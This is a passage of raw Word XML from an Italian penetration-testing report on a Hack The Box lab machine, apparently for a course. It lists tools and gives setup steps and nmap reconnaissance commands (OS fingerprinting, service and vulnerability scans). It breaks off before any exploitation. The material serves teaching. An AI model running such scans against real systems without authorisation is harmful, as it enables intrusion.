        <w:t xml:space="preserve"> 2.3.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7D23C4E3" w:rsidP="21040C4D" w:rsidRDefault="7D23C4E3" w14:paraId="3E5273A5" w14:textId="0A65B86B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7D23C4E3">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Mysql</w:t>
      </w:r>
      <w:r w:rsidR="7D23C4E3">
        <w:rPr/>
        <w:t>: 8.0.33</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7B46CA8A" w:rsidP="21040C4D" w:rsidRDefault="7B46CA8A" w14:paraId="20DBE582" w14:textId="7F134FE8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:hyperlink r:id="R55d5015335d1492a">
        <w:r w:rsidRPr="21040C4D" w:rsidR="7B46CA8A">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>www.crackstation.net/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="06B66413" w:rsidP="21040C4D" w:rsidRDefault="06B66413" w14:paraId="6C5FF261" w14:textId="68369E69">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="06B66413">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Qpdf</w:t>
      </w:r>
      <w:r w:rsidR="06B66413">
        <w:rPr/>
        <w:t>: 11.4.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2404A676" w:rsidP="21040C4D" w:rsidRDefault="2404A676" w14:paraId="1373842A" w14:textId="34AF4670">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2404A676">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>wafw00f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="06B66413" w:rsidP="21040C4D" w:rsidRDefault="06B66413" w14:paraId="37C874DE" w14:textId="3FF7C934">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="06B66413">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>OS</w:t>
      </w:r>
      <w:r w:rsidR="06B66413">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>: Kali GNU/Linux Rolling x86_64 (</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="06B66413">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Kernel</w:t>
      </w:r>
      <w:r w:rsidR="06B66413">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>: 6.5.0-kali3-amd64)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="58E30C23" w:rsidP="21040C4D" w:rsidRDefault="58E30C23" w14:paraId="01CF8FBF" w14:textId="6E73F0ED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="58E30C23">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>OpenVPN</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="00844FFE">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00844FFE">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>2.6.7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="1C3573CC" w:rsidP="21040C4D" w:rsidRDefault="1C3573CC" w14:paraId="4F0A89AD" w14:textId="69B6AC8D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1C3573CC">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="1C3573CC">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="1C3573CC">
        <w:rPr/>
        <w:t>–</w:t>
      </w:r>
      <w:r w:rsidR="1C3573CC">
        <w:rPr/>
        <w:t>sV</w:t>
      </w:r>
      <w:r w:rsidR="1C3573CC">
        <w:rPr/>
        <w:t xml:space="preserve"> –script=</w:t>
      </w:r>
      <w:r w:rsidR="1C3573CC">
        <w:rPr/>
        <w:t>vuln</w:t>
      </w:r>
      <w:r w:rsidR="1C3573CC">
        <w:rPr/>
        <w:t xml:space="preserve"> 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0C49B4CA" w:rsidP="21040C4D" w:rsidRDefault="0C49B4CA" w14:paraId="2BE2CB00" w14:textId="72502902">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="0" w:hanging="360"/>
        <w:jc w:val="left"/>
        <w:rPr/>
      </w:pPr>
      <w:hyperlink r:id="Rff34c41f63134980">
        <w:r w:rsidRPr="21040C4D" w:rsidR="0C49B4CA">
          <w:rPr>
            <w:rStyle w:val="Collegamentoipertestuale"/>
          </w:rPr>
          <w:t>https://www.urlencoder.io</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="1D9EB3B0" w14:textId="031EB865">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="5E63D825" w:rsidP="21040C4D" w:rsidRDefault="5E63D825" w14:paraId="694767B0" w14:textId="6446AB64">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc526556734" w:id="526359125"/>
      <w:r w:rsidR="5E63D825">
        <w:rPr/>
        <w:t>Informazioni preliminari</w:t>
      </w:r>
      <w:bookmarkEnd w:id="526359125"/>
    </w:p>
    <w:p w:rsidR="71C97B2D" w:rsidP="21040C4D" w:rsidRDefault="71C97B2D" w14:paraId="33A1E4B3" w14:textId="60234768">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="71C97B2D">
        <w:rPr/>
        <w:t>Per collegarsi è stato necessario scaricare la VPN che si trova sul sito di Hack The Box che ci permette di vedere nella rete loca l’ista</w:t>
      </w:r>
      <w:r w:rsidR="7048216B">
        <w:rPr/>
        <w:t xml:space="preserve">nza della macchina che vogliamo analizzare con il </w:t>
      </w:r>
      <w:r w:rsidR="7048216B">
        <w:rPr/>
        <w:t>pentesting</w:t>
      </w:r>
      <w:r w:rsidR="7048216B">
        <w:rPr/>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7048216B" w:rsidP="21040C4D" w:rsidRDefault="7048216B" w14:paraId="4ACFB2A8" w14:textId="7D33427F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="7048216B">
        <w:rPr/>
        <w:t xml:space="preserve">Tutti i test effettuati sulla macchina in quanto è una macchina </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7048216B">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">vulnerabile by design </w:t>
      </w:r>
      <w:r w:rsidR="7048216B">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>e tutto è stato eseguito nei limiti d’azione imposte dal corso</w:t>
      </w:r>
      <w:r w:rsidR="38369DD6">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7048216B" w:rsidP="21040C4D" w:rsidRDefault="7048216B" w14:paraId="1FAAF98A" w14:textId="30D08D2F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="7048216B">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="76CC6C5F">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">È fortemente raccomandato essere super user </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="76CC6C5F">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>(root)</w:t>
      </w:r>
      <w:r w:rsidR="76CC6C5F">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del sistema per imporre dei comandi che verranno illustrati in seguito, non eseguibili in altro modo.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="4A9D34FF" w:rsidP="21040C4D" w:rsidRDefault="4A9D34FF" w14:paraId="183461F6" w14:textId="4D60E339">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="4A9D34FF">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Prima ti poter connettersi alla macchina target andiamo ad aggiungere il sito </w:t>
      </w:r>
      <w:r w:rsidR="4A9D34FF">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>capiclean.htb</w:t>
      </w:r>
      <w:r w:rsidR="4A9D34FF">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> alla lista degli </w:t>
      </w:r>
      <w:r w:rsidR="4A9D34FF">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>host</w:t>
      </w:r>
      <w:r w:rsidR="4A9D34FF">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="084E5E93" w:rsidP="21040C4D" w:rsidRDefault="084E5E93" w14:paraId="211C09CA" w14:textId="67EDA8BE">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="084E5E93">
        <w:rPr/>
        <w:t>10.10.11.12</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="084E5E93">
        <w:rPr/>
        <w:t>capiclean.htb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="4C4812EF" w14:textId="78792D86">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="504C2A4B" w:rsidP="21040C4D" w:rsidRDefault="504C2A4B" w14:paraId="3718056F" w14:textId="49CAD4E0">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1757609426" w:id="976899483"/>
      <w:r w:rsidR="504C2A4B">
        <w:rPr/>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:r w:rsidR="504C2A4B">
        <w:rPr/>
        <w:t>gathering</w:t>
      </w:r>
      <w:bookmarkEnd w:id="976899483"/>
    </w:p>
    <w:p w:rsidR="504C2A4B" w:rsidP="21040C4D" w:rsidRDefault="504C2A4B" w14:paraId="09DC5419" w14:textId="286855DE">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="504C2A4B">
        <w:rPr/>
        <w:t xml:space="preserve">Per la raccolta delle informazioni è stato necessario recarsi alla pagina della sfida su HTB e Venire a conoscenza </w:t>
      </w:r>
      <w:r w:rsidR="54E67CBA">
        <w:rPr/>
        <w:t>dei suoi</w:t>
      </w:r>
      <w:r w:rsidR="504C2A4B">
        <w:rPr/>
        <w:t xml:space="preserve"> IP e l’architettura Linux.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="582F9A30" w:rsidP="21040C4D" w:rsidRDefault="582F9A30" w14:paraId="1DDE1BF5" w14:textId="30B9059A">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="582F9A30">
        <w:drawing>
          <wp:inline wp14:editId="69354242" wp14:anchorId="35F7487A">
            <wp:extent cx="5267324" cy="4162425"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1026190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a774142d5346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3ACB79" w:rsidP="21040C4D" w:rsidRDefault="113ACB79" w14:paraId="42891254" w14:textId="76000EEB">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc748779261" w:id="1198622884"/>
      <w:r w:rsidR="113ACB79">
        <w:rPr/>
        <w:t>Target</w:t>
      </w:r>
      <w:r w:rsidR="113ACB79">
        <w:rPr/>
        <w:t xml:space="preserve"> Discovery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1198622884"/>
    </w:p>
    <w:p w:rsidR="113ACB79" w:rsidP="21040C4D" w:rsidRDefault="113ACB79" w14:paraId="1B7A4173" w14:textId="0B524F81">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1246594115" w:id="1136326301"/>
      <w:r w:rsidR="113ACB79">
        <w:rPr/>
        <w:t>Ping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1136326301"/>
    </w:p>
    <w:p w:rsidR="743F59ED" w:rsidP="21040C4D" w:rsidRDefault="743F59ED" w14:paraId="7E0747DC" w14:textId="2C44F860">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t xml:space="preserve">Tramite il comando </w:t>
      </w:r>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t>ping</w:t>
      </w:r>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t xml:space="preserve"> andiamo a verificare l’avvenuta connessione alla VPN e andiamo a rilevare se la macchina target </w:t>
      </w:r>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t>è</w:t>
      </w:r>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t xml:space="preserve"> presenta all’interno della rete </w:t>
      </w:r>
      <w:r w:rsidR="743F59ED">
        <w:rPr/>
        <w:t>locale</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="20FE4E90" w:rsidP="21040C4D" w:rsidRDefault="20FE4E90" w14:paraId="44C2DBF5" w14:textId="17A7A83E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="20FE4E90">
        <w:drawing>
          <wp:inline wp14:editId="11AA0BC4" wp14:anchorId="46948191">
            <wp:extent cx="4828572" cy="1580952"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16610214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37844bde8d4a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3ACB79" w:rsidP="21040C4D" w:rsidRDefault="113ACB79" w14:paraId="373F447E" w14:textId="1AA2BC19">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1552291499" w:id="1251483307"/>
      <w:r w:rsidR="113ACB79">
        <w:rPr/>
        <w:t>Nmap</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1251483307"/>
    </w:p>
    <w:p w:rsidR="1A64CD88" w:rsidP="21040C4D" w:rsidRDefault="1A64CD88" w14:paraId="6B25F43A" w14:textId="11C95A5D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t xml:space="preserve">Con il comando </w:t>
      </w:r>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t xml:space="preserve"> andiamo ad effettuare alcune scansioni al fine di ottenere l’OS </w:t>
      </w:r>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t>Fingerprinting</w:t>
      </w:r>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t xml:space="preserve"> e andarci a visionare tutti i servizi attivi</w:t>
      </w:r>
      <w:r w:rsidR="192A7536">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="1A64CD88">
        <w:rPr/>
        <w:t xml:space="preserve">sulla macchina, con le relative </w:t>
      </w:r>
      <w:r w:rsidR="62F09BCA">
        <w:rPr/>
        <w:t>versioni e vulnerabilità note.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2F05F013" w:rsidP="21040C4D" w:rsidRDefault="2F05F013" w14:paraId="05F73BB4" w14:textId="4A858134">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve">I comandi effettuati per ottenere informazioni sulla macchina target sono i </w:t>
      </w:r>
      <w:r w:rsidR="4931F375">
        <w:rPr/>
        <w:t>seguenti</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2F05F013" w:rsidP="21040C4D" w:rsidRDefault="2F05F013" w14:paraId="7AC01065" w14:textId="2D843E44">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2F05F013">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">OS </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2F05F013">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Fingerprinting</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve"> –O 10.10.11.12 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2F05F013" w:rsidP="21040C4D" w:rsidRDefault="2F05F013" w14:paraId="3F66AADA" w14:textId="6097C255">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2F05F013">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Servizi attivi</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t>sC</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t>sV</w:t>
      </w:r>
      <w:r w:rsidR="2F05F013">
        <w:rPr/>
        <w:t xml:space="preserve"> 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="3AA1BB5E" w:rsidP="21040C4D" w:rsidRDefault="3AA1BB5E" w14:paraId="15C65497" w14:textId="24C2513F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:rPr/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="3AA1BB5E">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>Vulnerabilità note</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t>sV</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t xml:space="preserve"> –script=</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t>vuln</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t xml:space="preserve"> 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="3AA1BB5E" w:rsidP="21040C4D" w:rsidRDefault="3AA1BB5E" w14:paraId="117D00D4" w14:textId="4E67026A">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t>Tutti questi comandi possono essere seguiti dal flag –</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t>oX</w:t>
      </w:r>
      <w:r w:rsidR="3AA1BB5E">
        <w:rPr/>
        <w:t xml:space="preserve"> per avere un file in output persistente.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="75392597" w:rsidP="21040C4D" w:rsidRDefault="75392597" w14:paraId="0771BB60" w14:textId="326F735D">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="75392597">
        <w:drawing>
          <wp:inline wp14:editId="7698B97E" wp14:anchorId="0D4BFFD8">
            <wp:extent cx="5474085" cy="2840982"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1959052247" name="" descr="OS Fingerprinting&#10;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295231b5a044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085" cy="284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BED57E">
        <w:rPr/>
        <w:t xml:space="preserve">Risultato </w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="4CBED57E">
        <w:rPr/>
        <w:t xml:space="preserve"> –O 10.10.11.12</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="69F12E11" w:rsidP="21040C4D" w:rsidRDefault="69F12E11" w14:paraId="5F58E9B3" w14:textId="207FC3EA">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc906090048" w:id="684745385"/>
      <w:r w:rsidR="69F12E11">
        <w:rPr/>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:r w:rsidR="69F12E11">
        <w:rPr/>
        <w:t xml:space="preserve"> Target e Port Scanning</w:t>
      </w:r>
      <w:bookmarkEnd w:id="684745385"/>
    </w:p>
    <w:p w:rsidR="00516F0F" w:rsidP="21040C4D" w:rsidRDefault="00516F0F" w14:paraId="51328A27" w14:textId="372D8FB5">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
